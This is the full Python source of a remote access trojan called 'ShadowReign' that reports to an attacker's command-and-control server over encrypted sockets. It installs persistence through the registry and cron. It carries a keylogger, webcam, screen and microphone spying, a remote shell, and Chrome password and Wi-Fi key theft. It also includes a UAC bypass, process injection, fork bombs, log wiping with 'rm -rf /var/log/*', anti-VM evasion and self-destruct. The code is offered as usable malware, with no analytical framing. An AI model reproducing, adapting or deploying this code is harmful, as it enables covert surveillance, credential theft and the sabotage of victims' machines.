import socket
import json
import os
import threading
import subprocess
import platform
import shutil
import pynput.keyboard as kb
import pynput.mouse as ms
import mss
import cv2
import pyaudio
import wave
import pyttsx3
import psutil
import time
import base64
import sqlite3
import tkinter as tk
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import numpy as np
import random
import string
import ctypes  # For process injection (Windows)
import win32crypt  # For credential harvesting (Windows)

def rand_name(length=10):
    return ''.join(random.choices(string.ascii_letters, k=length))

class ShadowReignPayload:
    def __init__(self):
        self.c2_list = [("you ip", 1111)]  # Dynamic C2 list, update primary IP
        self.current_c2_index = 0
        self.KEY = b"ShadowReignBoss!"
        self.sock = None
        self.anti_vm_enabled = False
        self.keylogger = None
        self.running = True
        self.command_queue = []
        self.streaming_screen = False
        self.streaming_webcam = False
        self.streaming_mic = False
        self.offline_queue_file = os.path.join(os.getenv("APPDATA", "/tmp"), "sr_queue.enc")
        self.connect()
        self.persistence()

    def encrypt(self, data):
        try:
            cipher = AES.new(self.KEY, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
            iv = base64.b64encode(cipher.iv).decode()
            ct = base64.b64encode(ct_bytes).decode()
            return f"{iv}:{ct}"
        except Exception:
            return None

    def decrypt(self, data):
        try:
            iv, ct = data.split(":")
            iv = base64.b64decode(iv)
            ct = base64.b64decode(ct)
            cipher = AES.new(self.KEY, AES.MODE_CBC, iv=iv)
            return unpad(cipher.decrypt(ct), AES.block_size).decode()
        except Exception:
            return None

    def send_message(self, message):
        try:
            encrypted = self.encrypt(message)
            if not encrypted or not self.sock:
                self.queue_offline(message)
                return
            length = len(encrypted)
            length_bytes = length.to_bytes(4, byteorder='big')
            self.sock.send(length_bytes + encrypted.encode())
            time.sleep(0.01)
        except Exception:
            self.connect()

    def connect(self):
        delay = 5
        while self.running and not self.sock:
            try:
                if self.sock:
                    self.sock.close()
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect(self.c2_list[self.current_c2_index])
                self.send_info()
                self.execute_offline_queue()
                self.listen()
                break
            except Exception:
                self.current_c2_index = (self.current_c2_index + 1) % len(self.c2_list)  # Switch C2
                time.sleep(delay)
                delay = min(delay * 2, 60)

    def send_info(self):
        try:
            info = {
                "os": platform.system(),
                "hostname": socket.gethostname(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent,
                "anti_vm": self.anti_vm_enabled
            }
            self.send_message(json.dumps(info))
        except Exception:
            pass

    def listen(self):
        threading.Thread(target=self._listen, daemon=True).start()

    def _listen(self):
        while self.running:
            try:
                length_bytes = self.sock.recv(4)
                if not length_bytes:
                    self.sock = None
                    self.connect()
                    continue
                length = int.from_bytes(length_bytes, byteorder='big')
                data = self.sock.recv(length).decode()
                cmd = json.loads(self.decrypt(data))
                self.command_queue.append((cmd["command"], cmd.get("data")))
                self.execute_next()
            except Exception:
                self.sock = None
                self.connect()

    def execute_next(self):
        if not self.command_queue:
            return
        command, data = self.command_queue.pop(0)
        handlers = {
            "keylogger_start": self.keylogger_start,
            "keylogger_stop": self.keylogger_stop,
            "keylogger_dump": self.keylogger_dump,
            "list_files": self.list_files,
            "receive_file": self.receive_file,
            "send_file": self.send_file,
            "screenshot": self.screenshot,
            "record_screen": self.record_screen,
            "webcam_snap": self.webcam_snap,
            "shell": self.shell,
            "dump_hashes": self.dump_hashes,
            "steal_wifi": self.steal_wifi,
            "elevate_privileges": self.elevate_privileges,
            "jumpscare": self.jumpscare,
            "crash_system": self.crash_system,
            "fork_bomb": self.fork_bomb,
            "stream_screen": self.stream_screen,
            "stream_webcam": self.stream_webcam,
            "stream_mic": self.stream_mic,
            "stop_stream": self.stop_stream,
            "toggle_anti_vm": self.toggle_anti_vm,
            "inject": self.inject_process,
            "queue_command": self.queue_command,
            "self_destruct": self.self_destruct,
            "remote_desktop": self.remote_desktop,
            "harvest_creds": self.harvest_creds,
            "record_av": self.record_av,
            "spoof_info": self.spoof_info,
            "clear_logs": self.clear_logs,
            "switch_c2": self.switch_c2,
            "fake_alert": self.fake_alert
        }
        if command in handlers:
            try:
                handlers[command](data)
            except Exception as e:
                self.send_message(json.dumps({"error": f"{command} failed: {str(e)}"}))

    def persistence(self):
        try:
            if platform.system() == "Windows":
                exe_path = os.path.join(os.getenv("APPDATA"), f"{rand_name()}.py")
                shutil.copy(__file__, exe_path)
                subprocess.Popen(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {rand_name()} /t REG_SZ /d "pythonw {exe_path}" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif platform.system() in ["Linux", "Darwin"]:
                cron = f"@reboot python3 {os.path.abspath(__file__)}"
                subprocess.Popen(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    def queue_offline(self, message):
        try:
            if os.path.exists(self.offline_queue_file):
                with open(self.offline_queue_file, "r") as f:
                    queue = json.loads(self.decrypt(f.read()))
            else:
                queue = []
            queue.append(message)
            with open(self.offline_queue_file, "w") as f:
                f.write(self.encrypt(json.dumps(queue)))
        except Exception:
            pass

    def execute_offline_queue(self):
        try:
            if os.path.exists(self.offline_queue_file):
                with open(self.offline_queue_file, "r") as f:
                    queue = json.loads(self.decrypt(f.read()))
                for message in queue:
                    cmd = json.loads(message)
                    self.command_queue.append((cmd["command"], cmd.get("data")))
                os.remove(self.offline_queue_file)
                self.execute_next()
        except Exception:
            pass

    def inject_process(self, process_name):
        if platform.system() != "Windows":
            self.send_message(json.dumps({"error": "Injection only supported on Windows"}))
            return
        try:
            pid = [p.info["pid"] for p in psutil.process_iter(attrs=["pid", "name"]) if p.info["name"] == process_name][0]
            handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
            code = open(__file__, "rb").read()
            mem = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(code), 0x3000, 0x40)
            ctypes.windll.kernel32.WriteProcessMemory(handle, mem, code, len(code), 0)
            ctypes.windll.kernel32.CreateRemoteThread(handle, 0, 0, mem, 0, 0, 0)
            self.send_message(json.dumps({"status": f"Injected into {process_name}"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def queue_command(self, data):
        cmd = data["command"]
        self.queue_offline(json.dumps({"command": cmd, "data": data.get("data")}))
        self.send_message(json.dumps({"status": f"Command {cmd} queued"}))

    def self_destruct(self, _):
        try:
            if platform.system() == "Windows":
                subprocess.Popen(f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {rand_name()} /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.Popen("crontab -r", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            with open(__file__, "wb") as f:
                f.write(os.urandom(os.path.getsize(__file__)))
            os.remove(__file__)
            self.running = False
            self.send_message(json.dumps({"status": "Self-destruct complete"}))
            exit(0)
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def remote_desktop(self, data):
        action = data["action"]
        if action == "start":
            self.streaming_screen = True
            threading.Thread(target=self._remote_desktop_stream, daemon=True).start()
        elif action == "mouse":
            ms.Controller().position = (data["x"], data["y"])
            if data.get("click"):
                ms.Controller().click(ms.Button.left, 1)
        elif action == "key":
            kb.Controller().press(data["key"])
            kb.Controller().release(data["key"])

    def _remote_desktop_stream(self):
        try:
            sct = mss.mss()
            while self.streaming_screen:
                img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                self.send_message(json.dumps({"remote_frame": base64.b64encode(buffer).decode()}))
                time.sleep(0.033)  # ~30 FPS
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def harvest_creds(self, _):
        creds = {}
        try:
            if platform.system() == "Windows":
                path = os.path.join(os.getenv("APPDATA"), r"..\Local\Google\Chrome\User Data\Default\Login Data")
                if os.path.exists(path):
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, user, pwd in cursor.fetchall():
                        pwd = win32crypt.CryptUnprotectData(pwd)[1].decode()
                        creds[url] = {"user": user, "pass": pwd}
                    conn.close()
            self.send_message(json.dumps({"creds": creds}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def record_av(self, data):
        duration = int(data["duration"])
        type_ = data["type"]
        try:
            if type_ == "audio":
                p = pyaudio.PyAudio()
                stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
                frames = []
                for _ in range(0, int(44100 / 1024 * duration)):
                    frames.append(stream.read(1024))
                stream.stop_stream()
                stream.close()
                p.terminate()
                with wave.open("audio.wav", "wb") as wf:
                    wf.setnchannels(1)
                    wf.setsampwidth(2)
                    wf.setframerate(44100)
                    wf.writeframes(b''.join(frames))
                with open("audio.wav", "rb") as f:
                    self.send_message(json.dumps({"audio_rec": base64.b64encode(f.read()).decode()}))
                os.remove("audio.wav")
            elif type_ == "video":
                cap = cv2.VideoCapture(0)
                fourcc = cv2.VideoWriter_fourcc(*"XVID")
                out = cv2.VideoWriter("video.avi", fourcc, 20.0, (640, 480))
                start = time.time()
                while time.time() - start < duration:
                    ret, frame = cap.read()
                    if ret:
                        out.write(frame)
                cap.release()
                out.release()
                with open("video.avi", "rb") as f:
                    self.send_message(json.dumps({"video_rec": base64.b64encode(f.read()).decode()}))
                os.remove("video.avi")
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def spoof_info(self, data):
        self.fake_info = data
        self.send_message(json.dumps({"status": "Info spoofed"}))

    def clear_logs(self, _):
        try:
            if platform.system() == "Windows":
                subprocess.Popen("wevtutil cl System", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.Popen("wevtutil cl Application", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.Popen("rm -rf /var/log/*", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.send_message(json.dumps({"status": "Logs cleared"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def switch_c2(self, data):
        self.c2_list = [(ip, port) for ip, port in data["c2_list"]]
        self.current_c2_index = 0
        self.sock = None
        self.connect()
        self.send_message(json.dumps({"status": "C2 list updated"}))

    def fake_alert(self, data):
        try:
            root = tk.Tk()
            root.withdraw()
            tk.messagebox.showerror("System Alert", data["message"])
            root.destroy()
            self.send_message(json.dumps({"status": "Fake alert shown"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def toggle_anti_vm(self, enable):
        self.anti_vm_enabled = bool(enable)
        self.send_message(json.dumps({"status": f"Anti-VM {'enabled' if self.anti_vm_enabled else 'disabled'}"}))
        if self.anti_vm_enabled:
            self.anti_analysis()

    def anti_analysis(self):
        if not self.anti_vm_enabled:
            return
        try:
            if platform.system() == "Windows" and "VMware" in subprocess.check_output("wmic bios get serialnumber", shell=True).decode():
                self.crash_system(None)
                exit(0)
            elif platform.system() in ["Linux", "Darwin"] and "virtual" in subprocess.check_output("uname -r", shell=True).decode().lower():
                self.fork_bomb(None)
                exit(0)
        except Exception:
            pass

    def keylogger_start(self, _):
        if not self.keylogger:
            self.keylogger = Keylogger(self.sock, self.send_message)
            self.keylogger.start()
            self.send_message(json.dumps({"status": "Keylogger started"}))

    def keylogger_stop(self, _):
        if self.keylogger:
            self.keylogger.stop()
            self.keylogger = None
            self.send_message(json.dumps({"status": "Keylogger stopped"}))

    def keylogger_dump(self, _):
        if self.keylogger:
            self.keylogger.dump()

    def list_files(self, _):
        try:
            files = os.listdir()
            self.send_message(json.dumps({"files": files}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def receive_file(self, data):
        try:
            path = data["path"]
            content = base64.b64decode(data["content"])
            with open(path, "wb") as f:
                f.write(content)
            self.send_message(json.dumps({"status": f"File received: {path}"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def send_file(self, path):
        try:
            with open(path, "rb") as f:
                content = base64.b64encode(f.read()).decode()
                self.send_message(json.dumps({"file": content}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def screenshot(self, _):
        try:
            with mss.mss() as sct:
                if not sct.monitors:
                    self.send_message(json.dumps({"error": "No display available"}))
                    return
                img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
                img_np = np.array(img)
                _, buffer = cv2.imencode(".png", img_np, [int(cv2.IMWRITE_PNG_COMPRESSION), 9])
                self.send_message(json.dumps({"screenshot": base64.b64encode(buffer).decode()}))
        except Exception as e:
            self.send_message(json.dumps({"error": f"Screenshot failed: {str(e)}"}))

    def record_screen(self, _):
        try:
            sct = mss.mss()
            if not sct.monitors:
                self.send_message(json.dumps({"error": "No display available"}))
                return
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            out = cv2.VideoWriter("screen.avi", fourcc, 5.0, (1920, 1080))
            start = time.time()
            while time.time() - start < 10:
                img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                out.write(frame)
                time.sleep(0.1)
            out.release()
            with open("screen.avi", "rb") as f:
                self.send_message(json.dumps({"video": base64.b64encode(f.read()).decode()}))
            os.remove("screen.avi")
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def webcam_snap(self, _):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                self.send_message(json.dumps({"webcam": base64.b64encode(buffer).decode()}))
            else:
                self.send_message(json.dumps({"error": "No webcam available"}))
            cap.release()
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def shell(self, cmd):
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
            self.send_message(json.dumps({"output": output}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def dump_hashes(self, _):
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output("wmic useraccount get name,sid", shell=True).decode()
            else:
                output = subprocess.check_output("cat /etc/passwd", shell=True).decode()
            self.send_message(json.dumps({"hashes": base64.b64encode(output.encode()).decode()}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def steal_wifi(self, _):
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
                profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]
                wifi_data = {}
                for profile in profiles:
                    details = subprocess.check_output(f"netsh wlan show profile name=\"{profile}\" key=clear", shell=True).decode()
                    wifi_data[profile] = details
                self.send_message(json.dumps(wifi_data))
            else:
                self.send_message(json.dumps({"error": "WiFi stealing not supported on this OS"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def elevate_privileges(self, _):
        try:
            if platform.system() == "Windows":
                subprocess.Popen(f'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "pythonw {__file__}" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.Popen('eventvwr.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.send_message(json.dumps({"status": "Privilege elevation attempted"}))
            else:
                self.send_message(json.dumps({"error": "Privilege elevation not supported on this OS"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def jumpscare(self, _):
        try:
            engine = pyttsx3.init()
            engine.say("You’ve been owned by ShadowReign!")
            engine.runAndWait()
            self.send_message(json.dumps({"status": "Jumpscare executed"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def crash_system(self, _):
        try:
            if platform.system() == "Windows":
                while True:
                    threading.Thread(target=lambda: None).start()
            else:
                subprocess.Popen(":(){ :|: & };:", shell=True)
            self.send_message(json.dumps({"status": "System crash initiated"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def fork_bomb(self, _):
        try:
            if platform.system() == "Windows":
                subprocess.Popen("cmd /c :a & start cmd /c %0 & goto a", shell=True)
            else:
                subprocess.Popen(":(){ :|: & };:", shell=True)
            self.send_message(json.dumps({"status": "Fork bomb launched"}))
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def stream_screen(self, _):
        self.streaming_screen = True
        try:
            sct = mss.mss()
            if not sct.monitors:
                self.send_message(json.dumps({"error": "No display available"}))
                return
            while self.streaming_screen:
                img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                self.send_message(json.dumps({"stream_frame": base64.b64encode(buffer).decode()}))
                time.sleep(0.1)
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def stream_webcam(self, _):
        self.streaming_webcam = True
        try:
            cap = cv2.VideoCapture(0)
            while self.streaming_webcam:
                ret, frame = cap.read()
                if ret:
                    _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                    self.send_message(json.dumps({"webcam_frame": base64.b64encode(buffer).decode()}))
                time.sleep(0.1)
            cap.release()
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def stream_mic(self, _):
        self.streaming_mic = True
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            while self.streaming_mic:
                audio_data = stream.read(1024)
                self.send_message(json.dumps({"mic_chunk": base64.b64encode(audio_data).decode()}))
                time.sleep(0.01)
            stream.stop_stream()
            stream.close()
            p.terminate()
        except Exception as e:
            self.send_message(json.dumps({"error": str(e)}))

    def stop_stream(self, _):
        self.streaming_screen = False
        self.streaming_webcam = False
        self.streaming_mic = False
        self.send_message(json.dumps({"status": "Streams stopped"}))

class Keylogger:
    def __init__(self, sock, send_message):
        self.sock = sock
        self.send_message = send_message
        self.logs = ""
        self.active = False

    def on_press(self, key):
        if self.active:
            self.logs += str(key) + " "

    def start(self):
        self.active = True
        self.listener = kb.Listener(on_press=self.on_press)
        self.listener.start()

    def stop(self):
        self.active = False
        self.listener.stop()

    def dump(self):
        self.send_message(json.dumps({"keylogs": self.logs}))
        self.logs = ""

if __name__ == "__main__":
    payload = ShadowReignPayload()
    payload.anti_analysis()
    while payload.running:
        time.sleep(1)
